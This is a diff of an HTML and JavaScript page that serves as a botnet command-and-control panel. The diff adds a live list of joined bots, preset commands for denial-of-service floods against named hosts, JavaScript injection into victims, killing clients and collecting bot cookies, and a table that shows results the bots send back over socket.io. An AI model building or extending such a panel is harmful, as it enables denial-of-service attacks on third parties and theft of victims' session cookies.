@@ -9,6 +9,7 @@
         <link rel="shortcut icon" href="">
         <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css">
         <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap-theme.min.css">
+        <link rel="stylesheet" href="http://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/css/toastr.min.css">
         <style>body{padding-top:50px;}.starter-template{padding:40px 15px;text-align:center;}</style>
 
         <!--[if IE]>
@@ -26,13 +27,13 @@
                 <div class="panel-body">
                     <div class="row">
                         <div class="col-md-6">
-                            <img src="spacemarines" >
-                            <p>© YEAR Company_Name.</p>
+                            <img src="http://localhost:1337/assets/img/spacemarine.jpg" class="img-rounded" width="100%" height="100%">
+                            <p>© 2010 Steam Community.</p>
                         </div>
                         <div class="col-md-6">
                             <div>
                                 <h1> Bot list </h1>
-                                <div class="list-group">
+                                <div id="bot-list" class="list-group">
                                     <a href="#" data-id="" class="list-group-item">23423423</a>
                                     {{#each bots}}
                                     <a href="#" data-id="" class="list-group-item">{{@key}}</a>
@@ -41,22 +42,22 @@
                             </div>
                             <div>
                                 <h1> Available commands </h1>
-                                <div class="btn-group" role="group" aria-label="...">
-                                    <button type="button" data-format="" class="btn btn-default">DOS</button>
-                                    <button type="button" data-format="" class="btn btn-default">Inject Javascript</button>
-<!--                                    <button type="button" class="btn btn-default">getCookies</button>-->
-<!--                                    <button type="button" class="btn btn-default">srvScann</button>-->
-                                    <button type="button" data-format="" class="btn btn-default">Kill Client</button>
+                                <div id="cmd-list" class="btn-group" role="group" aria-label="...">
+                                    <button type="button" data-type="dos" data-format="{'dos':[{ 'prot': 'http', 'host':'www.nsa.com' , 'port': 80, 'numRequests': 20 },{ 'prot': 'https', 'host':'www.evilCorp.com' , 'port': 443, 'numRequests': 300 }]}" class="btn btn-default">DOS</button>
+                                    <button type="button" data-type="injectjs" data-format="console.log('you got hacked')" class="btn btn-default">Inject Javascript</button>
+                                    <!--                                    <button type="button" class="btn btn-default">getCookies</button>-->
+                                    <!--                                    <button type="button" class="btn btn-default">srvScann</button>-->
+                                    <button type="button" data-type="killclient" data-format="{'killClient': true }" class="btn btn-default">Kill Client</button>
+                                    <button type="button" data-type="getCookies" data-format="{'getCookies': true }" class="btn btn-default">Get Bot cookies</button>
                                 </div>
                             </div>
                         </div>
                     </div>
                     <div class="row">
-                        <form role="form" action="/command/send" method="post">
+                        <form>
                             <div class="form-group">
                                 <label for="inputPassword">Commands</label>
-                                <textarea name="commands" class="form-control" rows="5">{dos:[{ prot: "http", host:"www.nsa.com" , port: "80" },
-                                    { prot: "https", host:"www.evilCorp.com" , port: "443" }]}</textarea>
+                                <textarea id="input-command" class="form-control" data-cmd-type="" rows="5"></textarea>
                             </div>
 
                             <button type="submit" class="btn btn btn-success">
@@ -64,25 +65,26 @@
                             </button>
                         </form>
                     </div>
-                    <!--                    <div class="row">-->
-                    <!-- Table -->
-                    <!--
-<table class="table">
-<thead>
-<tr>
-<th>#Bot id</th>
-<th>Result</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<th>1</th>
-<td>Mark</td>
-</tr>
-</tbody>
-</table>
--->
-                    <!--                    </div>-->
+
+                    <div class="row">
+                        <!-- Table -->
+
+                        <table id="bot-data-table" class="table">
+                            <thead>
+                                <tr>
+                                    <th>#Bot id</th>
+                                    <th>Result</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <th>ngdxpcexx</th>
+                                    <td>test back</td>
+                                </tr>
+                            </tbody>
+                        </table>
+
+                    </div>
                 </div>
             </div>
         </div>
@@ -91,12 +93,52 @@
         <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/js/bootstrap.min.js"></script>
         <script src="https://cdn.socket.io/socket.io-1.2.0.js"></script>
         <script src="http://code.jquery.com/jquery-1.11.1.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>
         <script>
-            var socket = io();
-            // when a user click cmd button set html of commands to data-format
-            //                socket.emit('chat message', "hello");
-            // listen for bot-Join and add recieved {id: id} in the bot list
-            // on form submit
+            (function(){
+                var socket = io();
+                // listen for bot-Join and add recieved {id: id} in the bot list
+                socket.on('bot-join',function(data){
+                    toastr.success('','Bot Joined: ' + data.id)
+                    console.log('Bot Joined: ' + + data.id);
+                    $('#bot-list').append('<a href="#" data-id="" class="list-group-item">' + data.id + '</a>')
+                });
+                socket.on('bot-data',function(data){
+                    toastr.success('','Recieved bot data : ' + data.id)
+                    console.log('Recieved bot data : ' , data.id);
+                    $('#bot-data-table tr:last').after(
+                        $('<tr>').html(
+                            [
+                                '<th>' + data.id + '</th>',
+                                '<td>' + data.results + '</td>'
+                            ]
+                        )
+                    );
+                });
+                // when a user click cmd button set html of commands to data-format
+                $('#cmd-list button').click(function(){
+                    $('#input-command').val($(this).data('format'));
+                    $('#input-command').data('cmd-type',$(this).data('type'));
+                });
+                // on form submit
+                $('form').submit(function(e){
+                    e.preventDefault();
+
+                    var textcmd = $('#input-command').val().replace(/'/g, '"');
+
+                    if(textcmd.trim() == '') return;
+                    var command;
+
+                    if($('#input-command').data('cmd-type') == 'injectjs') command = {"injectJs": textcmd};
+                    else command = JSON.parse(textcmd)
+
+                    console.log(command)
+
+                    socket.emit('cmd', command);
+                    toastr.warning('','Command Sent ! ')
+
+                })
+            })()
         </script>
     </body>
 </html>
